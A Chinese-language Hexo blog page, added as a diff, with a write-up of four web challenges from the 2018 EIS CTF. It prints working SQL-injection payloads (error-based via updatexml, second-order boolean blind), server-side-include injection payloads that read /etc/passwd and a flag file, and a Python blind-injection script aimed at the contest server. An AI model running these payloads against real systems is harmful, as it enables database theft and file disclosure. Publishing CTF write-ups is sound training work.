@@ -1,0 +1,1141 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="CTF," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="simpleBBS题目：http://bbs.sec.zju.edu.cn/ 进入网站 注册 登录  题目中没有任何提示，只说是简单的bbs（论坛）各种操作轮番上阵xss各种弹，没卵用，甚至右边有个文件上传测试，以为是文件上传，结果也没找到上传点，好吧放弃了，   那是不可能的，一翻py，fuzz，注册的时候会报错，说明注册的时候需要加一个参数sn，抓包添加sn参数，注册成功。不过给我最大的启发是">
+<meta name="keywords" content="CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="EIS-CTF2018">
+<meta property="og:url" content="http://yoursite.com/2018/11/16/2018 高校网络信息安全管理运维挑战赛/index.html">
+<meta property="og:site_name" content="pig-佩奇">
+<meta property="og:description" content="simpleBBS题目：http://bbs.sec.zju.edu.cn/ 进入网站 注册 登录  题目中没有任何提示，只说是简单的bbs（论坛）各种操作轮番上阵xss各种弹，没卵用，甚至右边有个文件上传测试，以为是文件上传，结果也没找到上传点，好吧放弃了，   那是不可能的，一翻py，fuzz，注册的时候会报错，说明注册的时候需要加一个参数sn，抓包添加sn参数，注册成功。不过给我最大的启发是">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/1dNLEfQayFdnJqhH4rN6kWsulozQzAJIWsmrASqSK6g!/b/dD4BAAAAAAAA&bo=1wUUAwAAAAADB.c!&rf=viewer_4">
+<meta property="og:image" content="https://i.imgur.com/7VAUrdK.png">
+<meta property="og:image" content="https://i.imgur.com/I1cK3FY.png">
+<meta property="og:image" content="https://i.imgur.com/q4WWKMq.png">
+<meta property="og:image" content="https://i.imgur.com/AbgQOg0.png">
+<meta property="og:image" content="https://i.imgur.com/nmCN9P7.png">
+<meta property="og:image" content="https://i.imgur.com/QWDo2b3.png">
+<meta property="og:image" content="https://i.imgur.com/FHewbsx.png">
+<meta property="og:image" content="https://i.imgur.com/1OvWuoO.png">
+<meta property="og:image" content="https://i.imgur.com/dWsKl24.png">
+<meta property="og:image" content="https://i.imgur.com/IdxrzN8.png">
+<meta property="og:image" content="https://i.imgur.com/OOd1kvu.png">
+<meta property="og:image" content="https://i.imgur.com/QoxxXp2.png">
+<meta property="og:image" content="https://i.imgur.com/DD3Nya2.png">
+<meta property="og:image" content="https://i.imgur.com/VbFQcqd.png">
+<meta property="og:updated_time" content="2018-11-20T03:14:20.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="EIS-CTF2018">
+<meta name="twitter:description" content="simpleBBS题目：http://bbs.sec.zju.edu.cn/ 进入网站 注册 登录  题目中没有任何提示，只说是简单的bbs（论坛）各种操作轮番上阵xss各种弹，没卵用，甚至右边有个文件上传测试，以为是文件上传，结果也没找到上传点，好吧放弃了，   那是不可能的，一翻py，fuzz，注册的时候会报错，说明注册的时候需要加一个参数sn，抓包添加sn参数，注册成功。不过给我最大的启发是">
+<meta name="twitter:image" content="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/1dNLEfQayFdnJqhH4rN6kWsulozQzAJIWsmrASqSK6g!/b/dD4BAAAAAAAA&bo=1wUUAwAAAAADB.c!&rf=viewer_4">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/11/16/2018 高校网络信息安全管理运维挑战赛/"/>
+
+
+
+
+
+  <title>EIS-CTF2018 | pig-佩奇</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+	<a href="https://shuaizhupeiqi.github.io"><img style="position: absolute; top: 0; left: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_left_green_007200.png" alt="Fork me on GitHub"></a>
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">pig-佩奇</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/16/2018 高校网络信息安全管理运维挑战赛/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="佩奇">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="pig-佩奇">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">EIS-CTF2018</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-16T00:00:00+08:00">
+                2018-11-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="simpleBBS"><a href="#simpleBBS" class="headerlink" title="simpleBBS"></a>simpleBBS</h1><p>题目：<a href="http://bbs.sec.zju.edu.cn/" target="_blank" rel="noopener">http://bbs.sec.zju.edu.cn/</a></p>
+<p>进入网站 注册 登录</p>
+<p><img src="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/1dNLEfQayFdnJqhH4rN6kWsulozQzAJIWsmrASqSK6g!/b/dD4BAAAAAAAA&amp;bo=1wUUAwAAAAADB.c!&amp;rf=viewer_4" alt=""></p>
+<p>题目中没有任何提示，只说是简单的bbs（论坛）各种操作轮番上阵xss各种弹，没卵用，甚至右边有个文件上传测试，以为是文件上传，结果也没找到上传点，好吧放弃了，  </p>
+<p>那是不可能的，一翻py，fuzz，注册的时候会报错，<br><img src="https://i.imgur.com/7VAUrdK.png" alt=""><br>说明注册的时候需要加一个参数sn，抓包添加sn参数，注册成功。<br>不过给我最大的启发是这个页面报错，数据库，难道暗示着 数据库报错，注入？<br>试试 注册页面翻云覆雨的fuzz，好吧单引号过滤了，我注入你个螺旋大锤子。<br>？？不对，我登录页面给个单引号呢，经过一翻测试，必须要已经注册的账号加单引号才有效。<br>好的 测试开始，账号 username=xiaozhupeiqi1’&amp;password123456<br><img src="https://i.imgur.com/I1cK3FY.png" alt=""><br>这是啥？？数据库报错？好了，二话不说就是报错注入，<br><img src="https://i.imgur.com/q4WWKMq.png" alt=""><br>flag出来了，hiahiahia，提交，乔德麻袋？？flag咋不全，别担心换个函数<br>username=aaa’ and 1=updatexml(1,concat(0x3a,(select mid(flag,32,32) from flag) ,0x3a),1)–<br>OK了剩下的几位也出来了。此题 完！</p>
+<h1 id="SimpleExtensionExplorerInjection"><a href="#SimpleExtensionExplorerInjection" class="headerlink" title="SimpleExtensionExplorerInjection"></a>SimpleExtensionExplorerInjection</h1><p>请看题目，重点 xxe，后面是/flag，就是flag路径，</p>
+<p><img src="https://i.imgur.com/AbgQOg0.png" alt=""></p>
+<p>开局两个框，抓包!</p>
+<p><img src="https://i.imgur.com/nmCN9P7.png" alt=""></p>
+<p>我*？不是xml吗，你给我发个json格式包，你想做爪子？<br>不对，这是ctf，这很正常，佩奇老哥给你传个xml格式试试水，</p>
+<p><img src="https://i.imgur.com/QWDo2b3.png" alt=""></p>
+<p>牛皮，xml 数据可以传输，那么比较容易忽视的点来了，三个箭头的地方原本是json,既然要传输xml，一定要修改成xml，否则你做出来我吃*，<br>然后xxe,不会的请自行参考我的博客xxe，<br>来个payload 包，<br><img src="https://i.imgur.com/FHewbsx.png" alt=""><br>完结！</p>
+<h1 id="SimpleServerInjection"><a href="#SimpleServerInjection" class="headerlink" title="SimpleServerInjection"></a>SimpleServerInjection</h1><p><img src="https://i.imgur.com/1OvWuoO.png" alt=""></p>
+<p>重点，SSI 是服务器注入，拓展下，ssti是服务器模版注入，名字很像，利用方式有区别，然后flag在当前目录下，</p>
+<p>这道CTF题还是比较简单，但是需要点，点不对打死也做不出来，想复杂的话 更做不出来。</p>
+<p><img src="https://i.imgur.com/dWsKl24.png" alt=""></p>
+<p>payload </p>
+<pre><code>name=&lt;!--%23exec cmd=&quot;cat /etc/passwd&quot;--&gt;
+</code></pre><p>这里有个小点，如果是#浏览器会自动当成注释，不会解析发包，所以这里给编码%23<br>但是并没卵用，一开始以为会过滤了东西，但是看不出来哪过滤了，这个时候就要多尝试命令，<br>毕竟ssi有那么多命令<br>尝试过后使用 </p>
+<pre><code>name=&lt;!--%23include virtual=&quot;flag&quot;--&gt;
+</code></pre><p><img src="https://i.imgur.com/IdxrzN8.png" alt=""></p>
+<h1 id="SimpleBlog"><a href="#SimpleBlog" class="headerlink" title="SimpleBlog"></a>SimpleBlog</h1><p>题目，简单的blog,然后在classes给提示说是二次注入，一翻尝试之后无果，最后大佬给的思路，注意主页的提示<br>注意0分，final exam提交答卷会随机给一个成绩，既然说二次注入，会不会是看成绩的时候会把用户名啥的代入到数据库中，因为提交答卷分数插入到数据库，这里可能造成二次注入，即然这样那注入点就在用户名上面了，不断注册查看是否等于0，后来看wp晓得，当成绩为0时说明逻辑错误，不为0则逻辑正常。</p>
+<p><img src="https://i.imgur.com/OOd1kvu.png" alt=""></p>
+<p>然后注册 账号为 1’ or 1=1 or ‘</p>
+<p>账号这里有几个点着重说一下</p>
+<p>前面的1要单引号闭合，这句逻辑账号有三个语句要判断，第一个1’ 数据库中可能要查询啥不清楚后端代码，这里判断是错的，or 1=1 这个语句是对的， or’ 闭合语句这句也逻辑也是错的，所以我们 or判断只要是对的 那么分数查询那里就会是有分，否则就是0分。</p>
+<p>现在就可写脚本进行检测，首先确定好自己的 注入语句，这里是无法通过回显来注入的，所以我们通过布尔盲注写脚本。</p>
+<p>语句 zpq’ or ascii(substr((select flag from flag limit 0,1),1,1))&gt;1 or ‘</p>
+<p>查看效果 </p>
+<p><img src="https://i.imgur.com/QoxxXp2.png" alt=""></p>
+<p>语句 zpq’ or ascii(substr((select flag from flag limit 0,1),1,1))&gt;1000 or ‘</p>
+<p>这句 肯定为错，因为ascii码不可能大于1000</p>
+<p><img src="https://i.imgur.com/DD3Nya2.png" alt=""></p>
+<p>可以看到 返回为0说明是错误的，语句已经完成接下来就写个脚本跑出flag。</p>
+<pre><code>import requests
+import re
+
+
+headers = {
+&apos;Connection&apos;: &apos;close&apos;,
+}//防多次访问断开连接
+flag=&quot;&quot;
+for i in range(1,32):
+
+    for nmb in range(32,126):
+
+        payload={&apos;username&apos;:&quot;zpq888&apos; or ascii(substr((select flag from flag limit 0,1),%s,1))=%s or&apos;&quot;%(i,nmb),&apos;password&apos;:&quot;123&quot;}
+        s=requests.Session()
+        url_reg=&apos;http://210.32.4.20/register.php&apos;
+        r=s.post(url_reg,data=payload,headers=headers)
+        url_log=&apos;http://210.32.4.20/login.php&apos;
+        r=s.post(url_log,data=payload,headers=headers)
+        url_ans=&apos;http://210.32.4.20/answer.php&apos;
+        select={&apos;1.a&apos;:&apos;on&apos;}
+        r=s.post(url_ans,data=select,headers=headers)
+        result=r.content[2074:2075]
+        if int(result)!=0:
+            flag=flag+chr(nmb)
+            print flag
+            break
+</code></pre><p><img src="https://i.imgur.com/VbFQcqd.png" alt=""></p>
+<p>单线程太慢不跑了！</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/11/15/条件竞争漏洞/" rel="next" title="CTF中的条件竞争漏洞">
+                <i class="fa fa-chevron-left"></i> CTF中的条件竞争漏洞
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/11/17/SSI服务器注入/" rel="prev" title="SSI服务器注入">
+                SSI服务器注入 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">佩奇</p>
+              <p class="site-description motion-element" itemprop="description">佩奇的后花园</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">41</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#simpleBBS"><span class="nav-number">1.</span> <span class="nav-text">simpleBBS</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SimpleExtensionExplorerInjection"><span class="nav-number">2.</span> <span class="nav-text">SimpleExtensionExplorerInjection</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SimpleServerInjection"><span class="nav-number">3.</span> <span class="nav-text">SimpleServerInjection</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SimpleBlog"><span class="nav-number">4.</span> <span class="nav-text">SimpleBlog</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">佩奇</span>
+
+  
+</div>
+-->
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
